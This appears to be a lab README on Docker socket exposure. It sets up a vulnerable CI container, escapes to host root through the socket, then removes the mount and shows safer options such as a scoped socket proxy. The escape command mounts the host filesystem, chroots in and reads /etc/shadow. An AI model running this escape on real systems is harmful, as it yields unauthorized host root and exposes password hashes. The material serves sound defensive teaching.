# Docker socket escape: threat, exploit, fix, verify

> **DANGER — run only on a disposable VM or the Docker Desktop VM.**
> The exploit below gives a container full root on its host. Do not run it on
> a machine you care about, a shared CI host, or anything with real data.

## Why the socket is root

`/var/run/docker.sock` is the Docker Engine API. Anything that can talk to it
can create a container, and a container can be told to mount the host root
filesystem and run as real root. There is no privilege boundary between "can
use the socket" and "is root on the host": they are the same thing. Membership
of the `docker` group is therefore root-equivalent too.

## 1. Reproduce the vulnerable setup

```sh
docker compose -f vulnerable/compose.yaml up -d
```

`ci-runner` is an ordinary container that was handed the socket "so it can
build images" — a common and dangerous convenience.

## 2. Exploit — escape to host root

From inside the container that has the socket, start a *second* container that
is privileged and has the host's `/` bind-mounted, then `chroot` into it:

```sh
docker compose -f vulnerable/compose.yaml exec ci-runner \
  docker run --rm -v /:/host --privileged alpine:3.22 \
    chroot /host sh -c 'id; uname -a; head -n 3 /etc/shadow'
```

`id` prints `uid=0(root)`, and `/etc/shadow` — the host's password hashes —
is readable. At this point the "container" owns the host: it could add a user,
write a systemd unit, or read every other container's data.

## 3. Fix — take the socket away

```sh
docker compose -f vulnerable/compose.yaml down
docker compose -f fixed/compose.yaml up -d
```

`fixed/compose.yaml` has no socket mount. Verify the escape now fails:

```sh
docker compose -f fixed/compose.yaml exec ci-runner \
  docker -H unix:///var/run/docker.sock info
# -> Cannot connect to the Docker daemon at unix:///var/run/docker.sock
```

There is no socket to connect to, so there is no daemon to abuse.

## 4. When a job genuinely needs Docker API access

Do not reach for the raw socket. In order of preference:

1. **Do not give CI jobs the socket at all.** Build with a rootless builder
   (`docker buildx` with a rootless BuildKit, or `buildah`/`kaniko`), which
   needs no privileged daemon.
2. **Rootless Docker.** The daemon runs as an unprivileged user, so even a
   socket compromise does not yield host root.
3. **A scoped socket proxy.** `fixed/socket-proxy.compose.yaml` puts
   `ghcr.io/tecnativa/docker-socket-proxy` in front of the socket with a
   read-only allow-list (`POST: "0"` denies create/start/exec). The job talks
   to `tcp://dockerproxy:2375` and never sees the socket.

```sh
docker compose -f fixed/socket-proxy.compose.yaml up -d
# Reads are allowed:
docker compose -f fixed/socket-proxy.compose.yaml exec ci-runner \
  docker -H tcp://dockerproxy:2375 images
# Mutations are refused by the proxy:
docker compose -f fixed/socket-proxy.compose.yaml exec ci-runner \
  docker -H tcp://dockerproxy:2375 run --rm alpine:3.22 true
# -> the proxy returns 403 Forbidden for the POST
```

## Cleanup

```sh
docker compose -f vulnerable/compose.yaml down
docker compose -f fixed/compose.yaml down
docker compose -f fixed/socket-proxy.compose.yaml down
```

Verified 2026-09-21: `ghcr.io/tecnativa/docker-socket-proxy` (Tecnativa/docker-socket-proxy)
is active and not archived; ghcr.io is the registry the project recommends.
